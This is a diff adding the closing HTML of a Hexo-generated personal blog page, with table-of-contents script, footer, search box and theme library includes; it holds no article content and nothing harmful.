+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://pwning.tech" target="_blank">D4mianWayne</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Word Count:&nbsp;<span
+                class="white-color">37.2k</span>&nbsp;words
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;Total Visits:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;times
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;Total number of visitors:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;people
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">Loading Runtime....</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffDays + " days " + diffHours +
+                            " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffYears + " years " + diffDays +
+                            " days " + diffHours + " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/D4mianWayne" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:dubeyayushmanrobin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
